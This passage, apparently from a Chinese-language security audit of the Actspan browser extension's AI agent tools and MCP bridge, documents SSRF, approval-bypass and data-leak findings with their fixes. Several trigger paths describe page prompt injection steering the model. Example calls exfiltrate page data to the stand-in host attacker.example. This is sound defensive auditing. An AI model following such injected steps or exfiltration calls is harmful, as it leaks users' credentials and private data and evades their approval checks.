2. 模型调用 `tab_navigate({action:'open', url:'https://attacker.example/redirect'})`；首次会弹确认，用户批准后 `chrome.tabs.create` 加载公网 URL。
3. 服务端 302 到 `http://127.0.0.1:PORT/...`；初始 `isBlockedFetchUrl` 通过，浏览器跟随重定向并发出内网 GET（响应不回传，但请求已发出）。

**影响**
- 无审批外发与 `trustAll` 绕过已关闭；残余是 302 盲 SSRF，可触发本机/内网 GET 的副作用，或把用户引入攻击者控制的落地页。

**建议**
- `open` 加载后复检 `chrome.tabs.get(tab.id).url`，命中私有/非 http(s) 时关闭并失败；或在 `webNavigation`/`webRequest` 层阻断重定向。
- 补单测：`open` 到 `127.0.0.1`/`nip.io` 被拒绝且不调用 `chrome.tabs.create`；`open` 权限为 sensitive 且始终确认。顺带修复 `about:blank` 被 `isBlockedFetchUrl` 误拒的回归（`tab-navigate.ts:99-104`）。

**确认**：静态路径已证实；需真实 Chrome 验证 302 到内网/本机地址的实际可达性。

---

### 33. [已修复（第 34 轮）] `cdp_frame.snapshot` 递归调用 `evaluate`，绕过敏感审批读取跨域 iframe 文本

**状态**
第 34 轮已修复：`actionPermissions` 现为 `{ evaluate: 'sensitive', snapshot: 'sensitive' }`，并为两者补充审批文案；`snapshot` 不再通过未授权的内部 `evaluate` 读取跨域文本。以下保留原始分析。

**位置**
- `src/functions/cdp-frame.ts:93-98`（`permissionLevel: 'interact'`，仅 `evaluate` 为 `sensitive`）
- `src/functions/cdp-frame.ts:308-319`（`snapshot` 内部调用 `cdpFrameFunction.execute({ action: 'evaluate', ... })`）
- `src/functions/cdp-frame.ts:325-341`（把 `data.text` 原样返回）
- `src/ai/tool-executor.ts:411-439`（审批只在最外层工具调用发生一次）

**问题**
`cdp_frame` 的外层动作 `snapshot` 仍是 `interact`，`actionPermissions` 只把 `evaluate` 提升为 `sensitive`。执行 `snapshot` 时，代码在模块内部再次调用 `cdpFrameFunction.execute({ action: 'evaluate', ... })`；这次内部调用不经过 `tool-executor`，因此不会触发 `evaluate` 的敏感审批。最终固定表达式 `document.body?.innerText || ""` 在指定 `frame_id` 中执行，并用 `data.text` 返回。

`frame_id` 可通过同为 `interact` 的 `list` 获取；工具描述也明确写着“cross-origin penetration”。因此对同标签页内嵌的跨域 iframe（网银、邮箱、OAuth 页面）可以无确认读取正文。

**触发路径**
1. 页面上有提示注入，或用户请求分析当前页面。
2. 模型调用 `cdp_frame({ action: 'list' })` 取得 iframe 的 `frame_id`，再调用 `snapshot({ frame_id })`；两次都是 `interact`，不弹审批。
3. 内部 `evaluate` 直接在当前/跨域 frame 执行 `document.body.innerText`，结果进入模型上下文；若后续调用 `fetch_url`/`webhook`（需审批）或直接回答，就形成跨域数据外带。

**影响**
- 第 20 条已把 `evaluate` 提升为 `sensitive`，但 `snapshot` 保留了同等的跨域读取能力且没有审批，属于该修复的绕过。
- 主页面 content script 受同源策略限制，不能直接读跨域 iframe；CDP 路径可以，因而这是新增的敏感数据通道，不只是“重复读取页面文本”。
- 读取本身不弹确认，用户无法在数据进入模型前拒绝。

**修复建议**
- 把 `snapshot` 也加入 `actionPermissions: { snapshot: 'sensitive' }`（`list` 至少应展示域/数量，必要时提升）。
- 不要通过公开的 `execute` 递归切换动作；抽取内部 `snapshotFrame()` 辅助函数，由外层统一做一次权限判定，或让内部 `evaluate` 复用同一个已授权上下文并明确标记“内部调用”。
- 补测试：`snapshot` 的权限应为 `sensitive`，且跨域 `frame_id` 在未授权时不得执行。

**确认**：静态路径已证实；需真实 Chrome 验证跨域 iframe 的 `frame_id` 与文本返回。

---

### 34. [已修复] `cdp_network.get_body` 以 `interact` 返回未脱敏响应体，可读取令牌/PII

**位置**
- `src/functions/cdp-network.ts:101-108`（`permissionLevel: 'interact'`，只有 `get_cookies`/`set_cookie`/`delete_cookie` 为 `sensitive`）
- `src/functions/cdp-network.ts:319-369`（`get_body` 直接返回 `body`/`body_base64`）
- `src/functions/cdp-network.ts:88-96`（只有 `findApiEndpoints` 辅助路径调用 `redactSensitive`，工具主路径没有）

**问题**
`cdp_network` 的工具描述写着 “Response bodies are bounded and sensitive fields are redacted”，但 `get_body` 的实现只做大小截断，不调用 `redactSensitive`：文本响应原样进入 `data.body`，二进制响应原样进入 `data.body_base64`。`get_events` 返回的 URL 也没有查询参数脱敏。`get_body`/`get_events`/`start` 都不在 `actionPermissions` 中，默认 `interact` 不弹审批；只有读取 Cookie 的动作需要确认。

**触发路径**
1. 模型调用 `cdp_network({ action: 'start' })` 开始监听（`interact`，无确认）。
2. 页面完成一次带 `Authorization`/Cookie 的 API 请求，模型调用 `get_events` 取得 `request_id`。
3. 调用 `get_body({ request_id })`；响应体中的 bearer token、刷新令牌、邮箱、订单/身份信息原样进入模型上下文。
4. 页面提示注入可借一次普通页面操作触发上述流程；若显式指定其他 `tab_id`，外层会提升为 `sensitive`，但同标签页路径仍无确认。

**影响**
- 绕过了 `get_cookies` 的敏感审批：Cookie 本身受保护，但同一会话的 API 响应体（通常包含同等或更强的凭据）可直接读取。
- 响应体进入模型后可能被后续出站工具外发，或留在会话上下文/日志中；工具描述的“已脱敏”会误导调用方。
- 现有 `data-tools.test.mjs` 只验证截断和 base64，未验证脱敏，因此测试通过不代表安全属性成立。

**修复建议**
- 把 `get_body`（以及 `get_events` 的 URL/响应摘要）提升为 `sensitive`，或至少对命中凭据/PII 特征的响应要求确认。
- 在返回前对文本 body 使用 `redactSensitive`，并清理 headers/URL 查询参数中的 `token`/`code`/`key` 等；二进制 body 不建议默认回传，必要时要求显式批准。
- 补测试：含 `Authorization: Bearer ...` 的响应体必须被脱敏或拒绝；`get_body` 权限为 `sensitive`。

**确认**：静态路径已证实；需真实 Chrome 验证 CDP 响应体可达性与脱敏覆盖。

**状态**：已修复。`get_body` 已提升为 `sensitive` 并补审批文案（`src/functions/cdp-network.ts:101-110`）；文本响应返回前先按 JSON 结构化脱敏，非 JSON 走 `redactSensitive` 文本脱敏（`cdp-network.ts:348-365`）；二进制响应仍在审批后返回截断 base64。`data-tools.test.mjs` 新增“文本 body 脱敏且权限为 sensitive”用例。残余：二进制内容无法按字段脱敏，依赖审批；`get_events` 的 URL 已由 `describe` 脱敏。

---

### 35. [已修复（第 34 轮）] `page_skeleton` / `page_snapshot` 以 `read` 把密码、验证码、卡号或隐藏字段值送入模型

**状态**
第 33 轮新发现；第 34 轮已修复：`page_skeleton` 与 `page-grounding` 统一复用 `isSensitiveRecordedField`，对 `password`、`hidden`、敏感 `autocomplete` 及 name/id 语义字段只输出隐藏标记；`page-grounding.test.mjs` 与 `float-ball-shadow.test.mjs` 合计 74/74 pass。以下保留原始分析。

**位置**
- `src/content/page-skeleton.ts:138-140`（任何 `isElementEditable` 元素都写 `attrs.value`）
- `src/content/page-grounding.ts:407-409`（`sanitizeElementValue` 只拦 `type=password`）
- `src/functions/page-skeleton.ts:34-36`、`src/functions/page-snapshot.ts:20-22`（两者均 `permissionLevel: 'read'`）
- `src/content/page-grounding.ts:959-963`（效果证据仅隐藏 password；仅供对比）

**问题**
`page_skeleton` 的 `annotateInteractiveAttrs` 对 `input/textarea/select/contenteditable` 的当前值直接 `clipText(value, 20)` 写入骨架；`isElementEditable` 不排除 `type=password`，所以密码框的前 20 个字符也会进入 `attrs.value`。`page_snapshot` 的 `sanitizeElementValue` 只检查 `type=password`，`autocomplete=one-time-code`、`cc-number`、`cc-csc`、`type=tel/email` 等仍返回原值；`include_hidden=true` 时 `input type=hidden`（CSRF token、一次性密钥）也会进入候选并带 `value`。两个工具都是 `read`，不弹审批，结果直接进入模型上下文。

**触发路径**
1. 用户在登录/支付/验证码页面已输入密码、卡号或 OTP（输入框仍持有值）。
2. 模型调用 `page({action:'skeleton'})` 或 `page({action:'snapshot'})`，或直接调用 `page_skeleton`/`page_snapshot`。
3. 内容脚本把 `attrs.value` / `value` 序列化返回；工具结果原样进入模型（未经过 `redactSensitive`）。
4. 值进入模型上下文，可能被第三方 LLM 记录或被后续出站工具带出。

**影响**
- 与已修复的第 2 条（录制器）同类的敏感值泄露，但路径是“只读页面理解”，触发更自然、无需录制。
- 密码前 20 字符足以显著缩小暴力破解空间；OTP/卡号/隐藏 token 可能直接可用。
- 现有单测未覆盖骨架/快照的 value 脱敏，`read` 权限也没有审批兜底。

**修复建议**
- 骨架/快照统一复用录制器的敏感字段判定（`type=password`、`autocomplete` 敏感值、name/id 语义），对敏感字段只输出 `[已填写，值已隐藏]`，不输出原值或长度。
- 对 `input type=hidden`、`autocomplete=one-time-code/cc-*` 默认不返回 value；`include_hidden` 不应顺带放开值。
- 补单测：password、`autocomplete=one-time-code`、`cc-number`、hidden CSRF 字段的骨架/快照输出均不含原值。

**确认**：静态路径已证实；需真实 Chrome 验证 DOM 值与工具输出。

---

### 36. [已修复（第 35 轮）] MCP `tab.open` / `tab.navigate` 只校验协议，可打开本机/内网并静默读取

**状态**
第 35 轮已修复：`assertSafeNavigableTarget` 在 `tab.open`/`tab.navigate` 入口复用 `isBlockedFetchUrl` 与 `isCredentialUrl`；`waitComplete` 后复检最终 URL，`tab.open` 命中时关闭标签页并释放租约，`tab.navigate` 命中时回滚到原地址；审批文案加入脱敏后的目标 URL。测试覆盖 `127.0.0.1`、`nip.io`、`169.254.169.254` 与主框架默认读取。以下保留原始分析。


**位置**
- `src/background/mcp-bridge.ts:891-900`（`tab.open` 只调用 `isSafeNavigableUrl`，随后 `chrome.tabs.create`）
- `src/background/mcp-bridge.ts:910-913`（返回最终 `done.url`，未复检）
- `src/background/mcp-bridge.ts:922-932`（`tab.navigate` 同样只校验协议）
- `src/background/mcp-bridge.ts:676-680`（审批文案只有方法/任务/标签页，没有目标 URL）
- `src/background/mcp-bridge.ts:1000-1025`（`page.read` 为 `read`，读取当前任务租约内的标签页不弹审批）
- `src/lib/ssrf-guard.ts:88-96`（`isSafeNavigableUrl` 只判断 http/https/about:blank）

**问题**
`isSafeNavigableUrl` 只做协议白名单，不做 `isBlockedFetchUrl` 的主机/内网判断；`tab.open` 与 `tab.navigate` 在 bridge 层都没有调用后者。初始 URL 可以是 `http://127.0.0.1:PORT/admin`、`http://[::ffff:7f00:1]/`、`http://169.254.169.254/` 或通配 DNS 域名；`tab.open` 创建成功后取得租约，`page.read` 作为 `read` 能力不再审批，直接读取 `document.body.innerText`。`tab.navigate` 可把已租用的标签页切到内网地址，同样没有最终 URL 复检。

审批文案（`:676-680`）只显示 `Actspan 请求 interact 权限：tab.open`、任务与标签页，不显示 URL。用户无法从弹窗判断目标是不是本机/内网服务；一次看似普通的“打开标签页”批准即可覆盖后续静默读取。

**触发路径**
1. MCP 客户端（或被页面提示注入的代理）调用 `tab.open({ url: 'http://127.0.0.1:PORT/admin' })`。
2. 审批弹窗只显示方法名，不显示 URL；用户批准，`chrome.tabs.create` 打开本机/内网页面并取得租约。
3. 客户端调用 `page.read({ tabId })`；该能力为 `read`，不再审批，返回页面正文。
4. 若初始 URL 是公网地址并 302 到内网，`tab.open`/`tab.navigate` 也不会在 `waitComplete` 后拒绝最终地址。

**影响**
- 绕过第 7 条对 `fetch_url` 的 SSRF 防护，读取本机管理页、云元数据、路由器后台或内网服务；`page.read` 的结果进入模型上下文，可被后续出站工具带出。
- 与扩展自身的 `tab_navigate(open)` 不一致：后者已调用 `isBlockedFetchUrl` 并复检最终地址（第 32 条）；MCP bridge 的 `tab.open`/`tab.navigate` 仍留缺口。
- 审批不展示目标 URL，用户同意的是“打开标签页”，不是“访问该内网地址”。

**修复建议**
- 在 `tab.open` 与 `tab.navigate` 的入口调用 `isBlockedFetchUrl`，拒绝本机/内网/通配 DNS。
- `waitComplete` 后复检 `done.url`；`tab.open` 命中私有地址时关闭标签页并释放租约，`tab.navigate` 命中时拒绝返回并恢复/关闭标签页。
- 审批文案包含目标 URL（至少 host 与是否重定向），并补单测：`127.0.0.1`、`nip.io`、302 到内网均应被拒绝。

**确认**：静态路径已证实；需真实 Chrome 验证 `chrome.tabs.create` 对 loopback 的可达性与最终 URL 行为。

---

### 37. [已修复（第 35 轮）] `page.snapshot` 以 `read` 枚举所有 frame，无审批读取跨源 iframe 文本

**状态**
第 35 轮已修复：`page.snapshot` 默认只枚举主框架（`frameId === 0`）；显式 `include_frames: true` 时通过动态能力策略提升为 `sensitive` 并要求审批。测试覆盖默认只请求主框架、显式请求时包含子框架。以下保留原始分析。


**位置**
- `src/background/mcp-bridge.ts:1028-1055`（`page.snapshot` 为 `read`，通过 `listTabFrames` 对每个 frame 调用 `__page_grounding_snapshot`）
- `src/background/frame-routing.ts:75-110`（`listTabFrames` 使用 `chrome.webNavigation.getAllFrames`，包含跨源子框架）
- `src/content/page-grounding.ts:636-652`（`include_non_interactive`/`query` 时选择 `*`，遍历该 frame 的 DOM）
- `src/content/page-grounding.ts:448-465`（描述符返回 `text`、`label`、`surrounding_text`）
- `src/background/policy-executor.ts:7`（`page.snapshot` 为 `read`）
- `src/functions/redact.ts:116`（`text` 键被明确排除在 `SENSITIVE_KEYS` 之外，只做文本模式脱敏）

**问题**
第 34 轮已把 `cdp_frame.snapshot` 提升为 `sensitive`，但 `page.snapshot` 仍以 `read` 枚举 tab 内**所有** frame。由于 manifest 的 content script 是 `all_frames: true`，桥接层把 `__page_grounding_snapshot` 发到每个 frame 的隔离世界，子框架内容脚本可以读取自己 DOM 的 `text/label/surrounding_text`。`redactSensitive` 会把 `value` 掩码，但 `text` 键不掩码，只做手机号/令牌等模式替换；账户余额、姓名、订单号、邮件正文等普通文本不会被覆盖。

**触发路径**
1. 页面有跨源 iframe（OAuth、邮箱、支付/银行组件）或用户要求“理解当前页面”。
2. 模型调用 `page.snapshot({ include_non_interactive: true })`；`page.snapshot` 是 `read`，不弹审批。
3. bridge 对 `getAllFrames` 返回的每个 frame 调用快照，子框架 content script 返回 `text`/`label`/`surrounding_text`。
4. 跨源 iframe 文本随 `elements` 进入模型上下文；后续可用 `fetch_url`/`webhook` 外发。

**影响**
- 第 33 条修复（`cdp_frame.snapshot` → `sensitive`）可被 `page.snapshot` 直接绕过；无需 `debugger`，也不弹审批。
- 跨源 iframe 通常是登录/OAuth/支付等敏感内容；用户无法在数据进入模型前拒绝。
- `include_non_interactive: true` 会把静态文本也纳入，扩大读取面；`query`/`scope_selector` 可按需定向。

**修复建议**
- 仅主框架默认 `read`；检测到 `frameId !== 0`（或请求 `include_non_interactive` 的跨源 frame）时提升为 `sensitive` 并要求审批，或在 bridge 层只允许显式 `frame_id` 的已审批读取。
- 不要复用 `cdp_frame.snapshot` 的敏感路径来绕过审批；两处共享同一权限判定。
- 补测试：跨源 iframe 的 `text` 不应在未审批的 `page.snapshot` 中返回；主框架普通快照保持可用。

**确认**：静态路径已证实；需真实 Chrome 验证 `getAllFrames`/`all_frames` 对跨源 iframe 的实际注入与返回。

---

### 38. [已修复（第 35 轮）] MCP 数据能力注册把 `data.fetch`/`data.paginate` 降为 `read`、`data.download` 降为 `interact`，绕过工具自身审批

**状态**
第 35 轮已修复：`DATA_CAPABILITY_POLICIES` 将 `data.fetch`/`data.paginate`/`data.paginate_page`/`data.download` 统一注册为 `sensitive`；bridge 的 `ALWAYS_CONFIRM_CAPABILITIES` 使这些出站/落盘能力不能通过“本轮不再询问”跳过。测试断言注册策略不低于工具声明。以下保留原始分析。


**状态**
第 35 轮新发现，未修复。以下为静态路径分析。

**位置**
- `src/background/mcp-data.ts:14-20`（`data.fetch`/`data.paginate` 注册为 `read`；`data.download` 注册为 `interact`；`execute` 直接调用 `definition.execute`）
- `src/background/policy-executor.ts:30-44`（能力策略只来自注册值；`read` 不审批，`interact` 仅在 `tabScoped` 或 `context.tabId !== undefined` 时审批）
- `src/functions/fetch-url.ts:93-94`（`fetch_url` 自身声明为 `sensitive`）
- `src/functions/download-file.ts:62`（`download_file` 自身声明为 `sensitive`）
- `src/functions/paginate.ts:21`（`paginate` 自身声明为 `read`，但会向任意 URL 发出带凭据的请求）

**问题**
MCP bridge 的 `registerCapabilityHandler` 使用调用方传入的策略字符串，`Policy.check` 只读取这份注册值，不会回查 `FunctionDefinition.permissionLevel`。`mcp-data.ts` 因此把三个出站/落盘能力降级：

1. `data.fetch` 注册为 `read`，但它执行的是已声明为 `sensitive` 的 `fetch_url`。任意 URL 的 GET 本身就是数据外带通道（URL 查询串可携带页面内容），`fetch_url` 在 AI 工具路径上每次都要确认，MCP 路径却完全不弹窗。
2. `data.paginate`/`data.paginate_page` 注册为 `read`，执行会跟随重定向并携带 `credentials: 'include'` 的 `fetch`（详见第 39 条），同样没有审批。
3. `data.download` 注册为 `interact`，但它执行的是已声明为 `sensitive` 的 `download_file`。`interact` 只有在 `tabScoped` 或 `context.tabId` 存在时才要求确认；`data.download` 不是 `page.*`/`tab.*` 能力，在无默认标签页的 MCP 会话里可以静默写 Downloads（`content` 路径可写最多 10MB 任意文本，`url` 路径下载原始 URL）。

**触发路径**
1. 页面提示注入或恶意 MCP 客户端让模型调用 `data.fetch({ url: 'https://attacker.example/collect?q=' + 页面摘要 })`；能力为 `read`，不弹审批，页面数据随查询串离开。
2. 或调用 `data.download({ content: '<html>…</html>', filename: 'invoice.html' })`；无默认 `tabId` 时 `interact` 不触发审批，直接写入 Downloads。
3. `data.paginate` 可用于读取内网/第三方 JSON 并回传模型，见第 39 条。

**影响**
- 绕过第 7 条对 `fetch_url` 的 `sensitive`/always-confirm 设计与第 30 条对 `download_file` 的审批提升；同一能力在 AI 工具与 MCP 工具两条路径上的安全边界不一致。
- 页面可借一次普通 MCP 任务把用户上下文写入攻击者 URL，或在用户不知情时保存可被后续打开的文件。
- 现有 `mcp-bridge.test.mjs` 未覆盖 `data.*` 的审批断言；`data-tools.test.mjs` 只测工具本身，测不到注册层降级。

**建议**
- `Policy` 注册值不得低于 `FunctionDefinition.permissionLevel`；注册时统一取两者较高者，或在 `execute` 前按定义再检查一次。
- 把 `data.fetch`/`data.paginate`/`data.download` 至少提升为 `sensitive`，并把出站能力加入 always-confirm 集合（不要被“本轮不再询问”放行）。
- 补 MCP 路径测试：`data.fetch`/`data.paginate`/`data.download` 未审批时必须抛 `E_APPROVAL_REQUIRED`，批准后才执行；无 `tabId` 的 `data.download` 也必须审批。

**确认**：静态路径已证实；需真实 MCP 客户端/Chrome 验证审批弹窗与 Downloads 落地。

---

### 39. [已修复（第 35 轮）] `paginate` 不做 SSRF/凭据 URL 前置校验，`credentials:'include'` 默认跟随重定向

**状态**
第 35 轮已修复：`validate` 在请求前调用 `isBlockedFetchUrl`/`isCredentialUrl`；请求改为 `redirect: 'manual'` 与 `credentials: 'same-origin'`，3xx/opaqueredirect 直接返回 `redirect_blocked`，响应最终 URL 再次复检；工具提升为 `sensitive` 并补审批文案。测试覆盖 loopback、云元数据、通配 DNS、凭据页与 302。以下保留原始分析。


**状态**
第 35 轮新发现，未修复。与第 38 条的注册层降级相互独立：即使第 38 条把 `data.paginate` 提升为 `sensitive`，请求本身仍会在响应前打到内网/凭据页。

**位置**
- `src/functions/paginate.ts:21`（`permissionLevel: 'read'`）
- `src/functions/paginate.ts:35-40`（`validate` 只检查 `http/https`，没有 `isBlockedFetchUrl`/`isCredentialUrl`）
- `src/functions/paginate.ts:58`（`fetch(withQuery(...), { credentials: 'include' })`，默认跟随重定向）
- `src/functions/paginate.ts:68-70`（响应返回后才用 `isCredentialUrl(pageUrl)` 判断，且没有 `isBlockedFetchUrl(pageUrl)`）
- `src/functions/paginate.ts:96-105`（`fetchPaginatedPage` 同样在请求后才检查凭据页）
- `src/background/mcp-data.ts:18-19`（`data.paginate`/`data.paginate_page` 均为 `read`）

**问题**
`paginate` 的 `validate` 只拒绝非 http(s) 协议；`execute`/`fetchPaginatedPage` 直接 `fetch`，既不复用 `isBlockedFetchUrl`，也不在请求前检查 `isCredentialUrl`。浏览器默认 `redirect: 'follow'`，因此：

- 初始 URL 可以是 `http://127.0.0.1:PORT/admin`、`http://[::ffff:7f00:1]/`、`http://169.254.169.254/` 或通配 DNS 域名；
- 公网 URL 可 302 到内网，实际请求已经发出并携带目标域的 Cookie（`credentials: 'include'`）；
- 凭据页（登录/OAuth/重置密码）只有在响应返回后才被识别，此时请求与 Cookie 已发出，响应可能已进入内存；
- 最终 `pageUrl` 只做凭据判断，没有 `isBlockedFetchUrl`，内网响应会以 `redactDataPayload` 后的 JSON/文本返回给模型。

**触发路径**
1. MCP 客户端（或被页面提示注入的代理）调用 `data.paginate({ url: 'http://127.0.0.1:PORT/admin', param: 'page' })`。
2. 能力为 `read`（第 38 条）或至少没有 URL 前置校验；扩展直接 `fetch` 内网地址，返回管理页 JSON/文本。
3. 或调用 `data.paginate({ url: 'https://attacker.example/redirect', param: 'page' })`，公网 302 到内网/凭据页；请求已发出，凭据页判断发生在响应后。
4. 返回内容进入模型上下文，后续可被其他出站工具带出。

**影响**
- 绕过第 7 条对 `fetch_url` 的 SSRF 防护和第 30 条对下载 URL 的初始校验；`credentials: 'include'` 还扩大了“向凭据页发请求”的暴露面。
- `data-tools.test.mjs` 的“pagination refuses credential pages”只断言响应内容不返回，不能证明请求未发出；没有 loopback/302/通配 DNS 用例。
- 与第 38 条叠加时，整个过程无审批；即便注册层修复，盲 SSRF 与凭据页请求仍然存在。

**建议**
- 在 `validate`/执行入口统一调用 `isBlockedFetchUrl` 与 `isCredentialUrl`，凭据页在请求前拒绝。
- 使用 `redirect: 'manual'`，对 3xx 直接失败；若必须跟随，至少对每一跳/最终 `response.url` 复检 `isBlockedFetchUrl`/`isCredentialUrl`，并在命中时丢弃响应。
- 不要对任意目标使用 `credentials: 'include'`；默认 `same-origin`/`omit`，确有需要时再显式授权。
- 把 `data.paginate` 提升为 `sensitive` 并加入 always-confirm；补 `127.0.0.1`、`[::ffff:7f00:1]`、`nip.io`、302 到内网、凭据页前置拒绝的测试。

**确认**：静态路径已证实；需真实 Chrome/MCP 验证 Cookie 发送与 302 后的实际请求。

---

## 三、P2：低风险与加固建议

以下问题单独利用价值较低，但建议顺手处理。

1. **`request_confirmation` 可被模型直接调用并自由构造消息**（`src/functions/request-confirmation.ts:17-31`，`permissionLevel:'read'`）。结合第 8 条的全局信任，页面可以诱导模型先弹一个“无害”确认，再借 `trustAll` 放行后续敏感操作。建议对模型主动发起的确认做来源标记/限流，并禁止 `trustAll` 来自模型构造的请求。**第 3 轮更新**：已加 600 字上限与每分钟 10 次限流；第 5 轮复核已把 `sessionId`/`taskId` 传入确认函数（`src/ai/tool-executor.ts:237-240`），限流键按会话隔离，R3-1 已修复。模型仍可直接调用确认函数，但消息长度/频率受限。
2. **`install.js` 会扫描 `$HOME` 并写入未知 JSON 配置**（`mcp-server/install.js:24-46`、`:88`）。`walkJsonCandidates` 在 depth 0 会进入所有主目录、收集任何含 `mcpServers` 的 JSON（上限 500），`applyPlan` 直接修改这些文件（虽然有备份）。建议只处理已知配置路径，未知文件要求显式确认，并用临时文件 + rename 原子写入。**第 7 轮更新**：`planConfig` 默认把未知路径标为 `manual`，只有显式 `--include-unknown` 才允许写入；扫描仍遍历 `$HOME`，风险收窄但未完全消除。
3. **`stopBridgeDaemon` 依据可能过期的 metadata PID 发 SIGTERM**（`mcp-server/bridge-lock.js:239-259`）。PID 被系统复用时可能杀掉无关进程。建议校验 `/proc/<pid>/cmdline` 或 `ps` 命令行包含 bridge 标识后再发信号。**第 3 轮更新**：已加 `/proc`/`ps` 命令行校验；但 Windows 上两者均不可用，`stopBridgeDaemon` 会误判 `pid_mismatch`（R3-1）。**第 7 轮更新**：已加 Windows PowerShell `Get-CimInstance` 兜底（`bridge-lock.js:249-256`），该条已修复。
4. **`core-loop` 在空上下文时可能抛 TypeError**（`src/ai/core-loop.ts:844-848`）。`context` 为空时 `'role' in lastItem` 会崩溃。建议先判空。**第 3 轮更新**：已修复（`Boolean(lastItem) && 'role' in lastItem`）。
5. **`redact.ts` 覆盖不足/过度**（`src/functions/redact.ts:99-126`、`:73-80`）。`value` 键无论类型一律替换为 `[REDACTED]`，在审计/外发路径中会把数值型 `value` 变成字符串，破坏结构化字段；URL 的 userinfo、路径中的 token 没有脱敏；`isCredentialUrl` 只识别少数路径段。建议按值类型/键名精确处理，并补充 userinfo 与常见 token 路径。**第 3 轮更新**：URL userinfo 已脱敏，数值/布尔 `value` 已保持原类型；路径 token 仍未覆盖。
6. **`manifest.json` 权限面较宽**（`public/manifest.json:14-20`：`debugger`、`webRequest`、`history`、`bookmarks`、`clipboardRead`；`:29`、`:33` 为 `<all_urls>` 且 `all_frames:true`）。建议复核每个权限的必要性，缩小 `web_accessible_resources`；`history/bookmarks` 若仅用于显式工具，考虑按需申请或明确告知用户。**第 12 轮更新**：`web_accessible_resources` 已收窄为仅 `actspan-logo.svg`（`public/manifest.json:51-59`），不再暴露 `skills/**/*`；`permissions` 与 `<all_urls>`/`all_frames` 的权限面仍然较宽。
7. **每轮完成都自动推送完整助手回答到飞书**（`src/background/session-manager.ts:535-551`、`src/functions/webhook.ts:241-266`）。这是产品功能，但会在用户不知情时把页面内容/结论外发。建议在 UI 明示“自动推送”，并支持按会话关闭。
8. **截图 artifact 保留 24 小时、最多 24 张**（`src/lib/artifact-store.ts:20-23`），且截图 base64 会注入 LLM。建议对包含敏感页面的截图做显式过期提示，或在设置中提供“不保留截图”。
9. **`inFlightBridgeRequests` 以 `frame.id` 为键**（`src/background/mcp-bridge.ts:38`、`:122-131`）。重复 id 会覆盖前一个 controller，前一个请求无法被取消，且其 `finally` 会删掉后一个的条目。建议在插入前检查并拒绝重复 id，或改用自增内部键。**第 3 轮更新**：已拒绝重复 id。
10. **`bridge.js` 的 pending 队列没有并发上限**（`mcp-server/bridge.js:401-461`），daemon 的 `client.requests` 也按客户端 `message.id` 覆盖（`mcp-server/bridge-daemon.js:122-137`）。本地客户端可制造大量在途请求或重复 id。建议加每客户端并发/速率限制与重复 id 拒绝。**第 3 轮更新**：daemon 已加 32 在途上限并拒绝重复 id；**第 6 轮更新**：`bridge.js` 已加全局 64 在途上限（`:507-508`），daemon 为 32 且清理正常（`:120-154`），该条已修复。
11. **SSE 解析只接受 `data: `（冒号后必须有空格）**（`src/ai/llm-client.ts:422-427`）。部分 OpenAI 兼容服务会发送 `data:{...}`，这些事件会被静默丢弃，表现为空响应或超时。建议接受 `data:` 前缀后 `trimStart()`，并跳过以 `:` 开头的注释行。**第 3 轮更新**：已修复。
12. **Bark 推送把消息拼进 URL 路径**（`src/functions/webhook.ts:81-100`）。消息内容会进入代理/浏览器历史/网关日志。建议改用 POST body（Bark 支持 JSON POST），避免长文本进 URL。**第 3 轮更新**：已改为 POST body。
13. **`page-grounding` 的 `elementHandleMap` 对仍连接的元素强引用**（`src/content/page-grounding.ts:322-354`）。超大页面反复快照会保留大量 DOM 引用；注释已承认这一取舍。建议按快照代际/数量上限做清理，或在快照 ID 失效时批量释放。**第 3 轮更新**：已加 4000 上限；第 5 轮复核已修复“只清理带旧快照元数据句柄”的漏洞（`page-grounding.ts:333-339` 现在把无元数据的标注句柄也纳入上限），R3-2 关闭。
14. **`Channel` 分发消息时没有发送方校验**（`src/lib/channel.ts:83-118`）。`chrome.runtime.onMessage` 只按 `type` 路由，不检查 `sender.id`/`sender.url`/frame；目前网页无法直接发 runtime 消息，但这意味着一旦某个 content script 增加“页面 → 扩展”的中继（或扩展页面被 XSS），`__debug_run_plan` 等敏感处理器就会直接可达。建议对内部调试/计划执行接口增加来源白名单，并把“只允许扩展自身页面/指定 frame”作为默认策略。**第 3 轮更新**：已加 `sender.id` 与内部接口白名单；content script（含 iframe）仍可调用白名单接口，属于当前设计。
15. **usage 账本并发读改写会丢计数，写入失败被静默忽略**（`mcp-server/usage.js:40-72`、`mcp-server/bridge.js:569-576`）。两个 daemon 同读旧值再各自 rename 会覆盖计数；`record()` 返回 false 时 `appendAudit()` 仍返回 true。建议加锁/append-only JSONL，并检查返回值记录失败。**状态**：第 7 轮新发现，未修复。
16. **冷启动 `clientId` 的读-生成-写-再读存在竞态**（`mcp-server/identity.js:180-188`）。两个 MCP 进程同时首次启动时，一方可能返回 A 而最终落盘为 B；重启后任务 `clientId` 归属校验失败。建议用 `wx` 锁文件包住 get-or-create，或写入后统一再读最终值。**状态**：第 7 轮新发现，未修复。
17. **`ask_user` 向所有标签页广播问题，响应不校验来源**（`src/functions/ask-user.ts:86-91`、`:105-108`、`:167`）。问题/选项会出现在所有标签页和 extension page；任何标签页的 `__ask_user_response` 只按 requestId 匹配，先答者生效。恶意页面可借开放 Shadow DOM 读取并代替用户作答。建议有 `context.tabId` 时改用 `sendToTab`，并校验 `sender.tab.id`/`sessionId`。**状态**：第 8 轮新发现，未修复。
18. **AI 流事件跨标签页广播，content 侧自动绑定任意运行中任务**（`src/background/session-manager.ts:611-615`、`src/content/float-ball/hooks/useAIStream.ts:30-41`、`session-sync.ts:45-49`）。任务 A 运行时会因任务 B 的 `__ai_stream`/`__session_sync` 把 currentTask.id 改成 B，造成状态/结果/错误交错。建议附带 `originTabId` 并在 content 侧过滤，临时 ID 使用显式 pending 关联。**状态**：第 8 轮新发现，未修复。
19. **会话 ID 仅用 `Date.now()`，同毫秒创建会覆盖已有会话**（`src/background/session-manager.ts:1124-1146`）。两个创建入口同毫秒执行时后一个 `sessions.set` 覆盖前一个；事件、任务、资源清理都按 ID 索引，导致会话消失/结果错配。建议改用 `crypto.randomUUID()` 或时间戳+计数器并在创建前检查冲突。**状态**：第 9 轮新发现；第 34 轮结束观测已修复：`createSession` 改用 `crypto.randomUUID()`（无 UUID 时回退时间戳+随机串），不再依赖同毫秒 `Date.now()`。
